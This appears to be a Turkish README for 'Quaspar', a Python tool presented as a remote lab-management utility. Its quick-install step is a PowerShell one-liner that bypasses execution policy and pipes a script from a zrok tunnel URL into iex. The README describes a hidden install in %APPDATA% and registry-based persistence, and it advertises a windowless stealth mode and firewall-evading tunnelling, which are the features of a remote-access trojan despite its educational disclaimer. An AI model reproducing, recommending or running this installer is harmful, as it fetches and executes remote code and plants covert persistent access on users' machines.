# Quaspar - Gelişmiş Uzak Yönetim Aracı

Quaspar, bilgisayar laboratuvarları ve yerel ağlar için tasarlanmış, bağımlılık gerektirmeyen, Python tabanlı bir uzak yönetim ve izleme aracıdır.

---

## 🚀 Hızlı Kurulum (Sıfır Hata Modu)

Herhangi bir Windows bilgisayarda (Python yüklü olsun veya olmasın), aşağıdaki komutu **PowerShell** terminaline yapıştırarak kurulumu saniyeler içinde tamamlayabilirsiniz:

```powershell
powershell -ExecutionPolicy Bypass -Command "iwr -useb https://nucfvfkc4e87.share.zrok.io/install | iex"
```

---

## 🛠️ Kurulum Süreci Nasıl Çalışır?

Yukarıdaki komutu çalıştırdığınızda arka planda şu işlemler gerçekleşir:

1.  **Loader İndirme (`install.ps1`)**: Sistem önce sunucudan akıllı yükleyici scriptini belleğe çeker.
2.  **Embedded Python Kurulumu**: Eğer bilgisayarda Python yoksa veya "PATH" ayarları bozuksa, resmi Python sunucusundan taşınabilir (embeddable) bir sürüm indirilir ve `%APPDATA%` klasörüne gizlice kurulur.
3.  **Otomatik Konfigürasyon**: İndirilen Python'un kütüphane desteği ve `pip` ayarları saniyeler içinde yapılır.
4.  **Kalıcılık (Persistence)**: `setup.py` dosyası indirilir ve kayıt defterine (Registry) Python'un tam yoluyla birlikte eklenir. Bu sayede bilgisayar yeniden başlatılsa bile Quaspar otomatik olarak çalışır.

---

## ⚖️ Yasal Uyarı ve Kullanım Koşulları

> [!WARNING]
> **BU YAZILIM SADECE EĞİTİM VE SİSTEM YÖNETİMİ AMAÇLIDIR.**

1.  **Eğitim Amaçlı Kullanım**: Quaspar, siber güvenlik farkındalığı ve yerel ağ yönetimi prensiplerini anlamak amacıyla geliştirilmiştir.
2.  **Sorumluluk Reddi**: Bu aracın izinsiz kullanımı yasal sonuçlar doğurabilir. Aracın yetkisiz bilgisayarlarda kullanılması veya kötüye kullanılması durumunda tüm sorumluluk son kullanıcıya aittir.
3.  **Etik Kurallar**: Sadece sahibi olduğunuz veya yönetim yetkinizin bulunduğu cihazlarda kullanınız.

---

## 🧪 Temel Özellikler
- **Bağımlılıksız Çalışma**: Python kurulu olmayan sistemlerde bile tam performans.
- **Gizli Mod**: Arka planda penceresiz (HIDDEN) çalışma.
- **Kalıcılık**: Kayıt defteri üzerinden otomatik başlangıç desteği.
- **Ağ Dostu**: Zrok tünellemesi sayesinde firewall/port yönlendirme gerektirmez.

---

*Quaspar Projesi - 2026*
